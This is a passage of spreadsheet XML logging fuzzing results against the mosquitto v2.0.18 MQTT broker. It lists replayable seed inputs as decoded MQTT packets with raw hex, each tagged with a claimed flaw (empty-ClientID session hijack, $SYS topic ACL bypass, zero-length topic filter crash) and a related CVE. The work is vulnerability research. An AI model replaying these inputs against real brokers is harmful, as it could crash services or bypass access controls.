        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 780B (报告+请求数据)\u000a请求数据: 86B\u000a\u000a---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CVE=CVE-2023-3592)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(86B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=9 Topics=['$share/g3/home/+/temperature'(QoS=1), '+/data'(QoS=1), 'sensor/temp'(QoS=0)] | raw_header=82380009001c2473686172652f67332f\u000aMsg[2]: PUBLISH Topic='a/b/c/d/e' QoS=2 retain=True payload='\x00\u000a%Õ&lt;OÚoiyç#-\u000a' | raw_header=35190009612f622f632f642f65000a25\u000aMsg[3]: TYPE0  | raw_header=0f</f>
        <v/>
      </c>
      <c r="F4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2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2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J462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6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3">
      <c r="A463" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B463" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C463" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(92B)\u000a4.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463" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0305 ===\u000a大小: 782B (报告+请求数据)\u000a请求数据: 92B\u000a\u000a---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MQTT请求序列(92B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=105500044d5154540400000000000000\u000aMsg[2]: (不完整,5B) raw=2221402301\u000a(尾部5B): 2221402301</f>
        <v/>
      </c>
      <c r="F4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6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63" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J46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6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64">
      <c r="A464" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B464" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C464" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(148B)\u000a4.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64" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0306 ===\u000a大小: 817B (报告+请求数据)\u000a请求数据: 148B\u000a\u000a---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MQTT请求序列(148B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20a00044d5154540402203c\u000aMsg[2]: TYPE0  | raw_header=000b61666c6e65745f66757a7a\u000aMsg[3]: SUBSCRIBE PacketID=2 Topics=['test/topic'(QoS=0)] | raw_header=820f0002000a746573742f746f706963\u000aMsg[4]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload='\x00\x03\x00\x01\x02\x03' | raw_header=341a0012245359532f62726f6b65722f\u000aMsg[5]: PUBREC PacketID=21830 | raw_header=504c55460000105500044d51545404c6</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J46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6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5">
      <c r="A465" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B465" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C465" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(3418B)\u000a4.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465" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0385 ===\u000a大小: 6649B (报告+请求数据)\u000a请求数据: 3418B\u000a\u000a---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MQTT请求序列(3418B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v114 ClientID='èt/'(3B) clean_session=False keepalive=25455s Will=YES [持久会话] | raw_header=105500044d5154547265636f000003e8\u000aMsg[2]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[3]: PUBCOMP PacketID=24687 | raw_header=702f606f70616c2140232425000a7769\u000aMsg[4]: PUBREC PacketID=12130 | raw_header=59532f62726f6b65723f3f3f3f3f3f3f\u000aMsg[5]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=151515151515151515151515153f3f3f\u000aMsg[8]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[9]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[10]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f1f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[11]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[12]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[13]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[14]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[15]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[16]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[17]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[18]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[19]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[20]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[21]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[22]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[23]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f373f3f3f\u000aMsg[24]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f3f\u000aMsg[25]: PUBREL PacketID=25964 | raw_header=6576656c3401001c2473686172652f67\u000a(尾部1786B): 657273696f6e02002b766572792f646565702f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c657665</f>
        <v/>
      </c>
      <c r="F4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6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65" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J46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6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66">
      <c r="A466" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B466" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C466" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(216B)\u000a4.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466" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0386 ===\u000a大小: 1237B (报告+请求数据)\u000a请求数据: 216B\u000a\u000a---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MQTT请求序列(216B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20a8002000674657302003c\u000aMsg[2]: TYPE0  | raw_header=000163\u000aMsg[3]: SUBSCRIBE PacketID=13 Topics=['test/#'(QoS=0)] | raw_header=820b000d0006746573742f2300\u000aMsg[4]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00\x0e' | raw_header=330e000a746573742f746f706963000e\u000aMsg[5]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload_len=106B | raw_header=347e0012245359532f62726f6b65722f\u000aMsg[6]: (不完整,44B) raw=414141414141414141414141414141414141414141310d0006245359532f2368656c6c6f4b020011\u000a(尾部44B): 414141414141414141414141414141414141414141310d0006245359532f2368656c6c6f4b020011c000e000</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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6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67">
      <c r="A467" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:3,cat:03c4</t>
        </is>
      </c>
      <c r="B467" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C467" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000008,sev:3,cat:03c4)中的REQUEST DATA提取出来(1493B)\u000a4.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467" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:03c4 ===\u000a大小: 2206B (报告+请求数据)\u000a请求数据: 1493B\u000a\u000a---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MQTT请求序列(1493B原始二进制) ---\u000aMsg[1]: (不完整,1493B) raw=a2ff1c343a00820afffe000646ff262623003326263a2626262626262626262626347e0012245359\u000a(尾部1493B): a2ff1c343a00820afffe000646ff262623003326263a2626262626262626262626347e0012245359532f6226262626262626</f>
        <v/>
      </c>
      <c r="F4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7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67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67" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话隔离违规)</t>
        </is>
      </c>
      <c r="J467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46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68">
      <c r="A468" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B468" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C468" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(474B)\u000a4.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68" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 851B (报告+请求数据)\u000a请求数据: 474B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(474B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=615 Topics=[''(零长度!QoS=3)] | raw_header=8265026700007f5359562f62726f6b65\u000aMsg[2]: CONNACK session_present=114 reason_code=112 | raw_header=2f677270312f746573742f2b023b1700\u000aMsg[3]: (不完整,266B) raw=08b960aa99e1a97e4f1b5e5e5e5e3e5e5e5e5e5e5e305e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5efa\u000a(尾部266B): 08b960aa99e1a97e4f1b5e5e5e5e3e5e5e5e5e5e5e305e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5efa0000fa5e5e5e5e5e5e5e</f>
        <v/>
      </c>
      <c r="F4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68" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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6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69">
      <c r="A469" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B469" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C469" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(124B)\u000a4.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469" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 667B (报告+请求数据)\u000a请求数据: 124B\u000a\u000a---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MQTT请求序列(124B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=29545 | raw_header=657273696f6e00022d2399fa08001224\u000aMsg[2]: SUBSCRIBE PacketID=12 Topics=[''(零长度!QoS=0)] | raw_header=8206000c00008002</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J46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0">
      <c r="A470" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B470" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C470" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(221B)\u000a4.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70" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 910B (报告+请求数据)\u000a请求数据: 221B\u000a\u000a---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MQTT请求序列(221B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=378 Topics=['$share/gr\x8c2/sensor/#'(QoS=0), ''(零长度!QoS=3)] | raw_header=8240017a00142473686172652f67728c\u000aMsg[2]: PINGRESP  | raw_header=d41f001c2473686172652f67332f686f\u000aMsg[3]: PUBLISH Topic='a/b/c/d/e' QoS=0 retain=False payload_len=101B | raw_header=30700009612f622f632f642f65250217\u000aMsg[4]: (不完整,8B) raw=656e736f722f2300\u000a(尾部8B): 656e736f722f2300</f>
        <v/>
      </c>
      <c r="F4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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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1">
      <c r="A471" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B471" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C471" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(120B)\u000a4.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71" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 849B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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MQTT请求序列(120B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4633 Topics=['$SYS/broker/version'(QoS=1), ''(零长度!QoS=2)] | raw_header=821b12190013245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=57B | raw_header=3858001d245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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7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2">
      <c r="A472" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B472" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C472" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000008,sev:4,cat:0140)中的REQUEST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72" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0140 ===\u000a大小: 736B (报告+请求数据)\u000a请求数据: 167B\u000a\u000a---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MQTT请求序列(167B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=269 Topics=[''(零长度!QoS=1)] | raw_header=8251010d0000152473686172652f6772\u000aMsg[2]: PUBLISH Topic='home/+/temperature' QoS=2 retain=False payload_len=61B | raw_header=34510012686f6d652f2b2f74656d7065\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F4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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J47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3">
      <c r="A473" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B473" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C473" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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73" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0142 ===\u000a大小: 795B (报告+请求数据)\u000a请求数据: 85B\u000a\u000a---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MQTT请求序列(85B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=5043 Topics=[''(零长度!QoS=0), 'test/topic'(QoS=1), ''(零长度!QoS=1)] | raw_header=821513b3000000000a746573742f746f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload='_#ÛÄ\x19»h\x8dñ\x86 \x1bAò¯"&gt;âã\u0009ÕS~\x0f,Y¬®°y\x94\x0f\x9coÓµ*&lt;' | raw_header=303b0013245359532f62726f6b65722f\u000aMsg[3]: PUBLISH  | raw_header=3b</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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7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4">
      <c r="A474" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B474" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C474" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(231B)\u000a4.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474" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c0 ===\u000a大小: 987B (报告+请求数据)\u000a请求数据: 231B\u000a\u000a---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MQTT请求序列(231B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=249 Topics=[''(零长度!QoS=0)] | raw_header=825600f900001c2473686172652f6733\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=1 retain=True payload_len=115B | raw_header=338a0100152473686172652f6772702f\u000aMsg[3]: UNSUBACK  | raw_header=b700</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J47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5">
      <c r="A475" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B475" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C475" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(88B)\u000a4.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475" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c2 ===\u000a大小: 985B (报告+请求数据)\u000a请求数据: 88B\u000a\u000a---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MQTT请求序列(88B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3546 Topics=[''(零长度!QoS=1)] | raw_header=82050dda000001\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=51B | raw_header=39480013245359532f62726f6b65722f\u000aMsg[3]: (不完整,7B) raw=aa987cc015e000\u000a(尾部7B): aa987cc015e000</f>
        <v/>
      </c>
      <c r="F4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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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7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6">
      <c r="A476" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B476" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C476" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(598B)\u000a4.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0x0244\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E476" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 1627B (报告+请求数据)\u000a请求数据: 598B\u000a\u000a---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MQTT请求序列(598B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4 Topics=[''(零长度!QoS=0)] | raw_header=8206000400008067\u000aMsg[2]: PUBREL PacketID=26471 | raw_header=677f6767676767676767676767676767\u000aMsg[3]: PUBREL PacketID=26471 | raw_header=67676767676767676767676756676767\u000aMsg[4]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[5]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[6]: PUBREL PacketID=26471 | raw_header=67676767676767676767676767676767\u000aMsg[7]: (不完整,41B) raw=67676767676767676767676767676767676d676767676767676767676767676767676767676767e0\u000a(尾部41B): 67676767676767676767676767676767676d676767676767676767676767676767676767676767e000</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J47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7">
      <c r="A477" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B477" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C477" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(373B)\u000a4.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477" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0246 ===\u000a大小: 1199B (报告+请求数据)\u000a请求数据: 373B\u000a\u000a---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MQTT请求序列(373B原始二进制) ---\u000aMsg[1]: PINGREQ  | raw_header=c000\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=3)] | raw_header=82190001000013245359532f62726f6b\u000aMsg[3]: PUBLISH Topic='$SYS/brokerÿ\x7f\x00\x00\x91 to' QoS=2 retain=False payload_len=83B | raw_header=34680013245359532f62726f6b6572ff\u000aMsg[4]: PUBREL PacketID=20560 | raw_header=6450505050646224db9175694f2e0012\u000aMsg[5]: CONNACK session_present=35 reason_code=38 | raw_header=2034232600ff23232323232323232323\u000aMsg[6]: PUBREC PacketID=25124 | raw_header=50646224db9175694f2e001224736861</f>
        <v/>
      </c>
      <c r="F4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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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7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78">
      <c r="A478" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B478" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C478" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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478" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 886B (报告+请求数据)\u000a请求数据: 35B\u000a\u000a---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MQTT请求序列(35B原始二进制) ---\u000aMsg[1]: (不完整,35B) raw=822600010000ff1806dbb8dbbbdbdbc000822600010000ff1406fbb8dbdbdbdb636432\u000a(尾部35B): 822600010000ff1806dbb8dbbbdbdbc000822600010000ff1406fbb8dbdbdbdb636432</f>
        <v/>
      </c>
      <c r="F4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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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79">
      <c r="A479" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B479" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C479" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000008,sev:4,cat:0344)中的REQUEST DATA提取出来(14B)\u000a4.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79" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0344 ===\u000a大小: 733B (报告+请求数据)\u000a请求数据: 14B\u000a\u000a---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MQTT请求序列(14B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: SUBSCRIBE PacketID=21508 Topics=[''(零长度!QoS=0)] | raw_header=860454040000\u000aMsg[3]: PUBLISH  | raw_header=3c00\u000aMsg[4]: (不完整,4B) raw=0d70007f\u000a(尾部4B): 0d70007f</f>
        <v/>
      </c>
      <c r="F4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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J47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7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80">
      <c r="A480" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_7.tar.gz/replayable-violations/id:000008,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B480" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C480" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000008,sev:4,cat:03c4)中的REQUEST DATA提取出来(122B)\u000a4.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80" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:03c4 ===\u000a大小: 1037B (报告+请求数据)\u000a请求数据: 122B\u000a\u000a---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PacketID=20 Topics=[''(零长度!QoS=2)] | raw_header=8219001400000a746573742f746f7069\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=0 retain=True payload_len=77B | raw_header=395a000b73656e736f722f74656d7027\u000aMsg[3]: PUBLISH  | raw_header=3c0100</f>
        <v/>
      </c>
      <c r="F4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80" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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48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81">
      <c r="A481" s="2" t="inlineStr">
        <is>
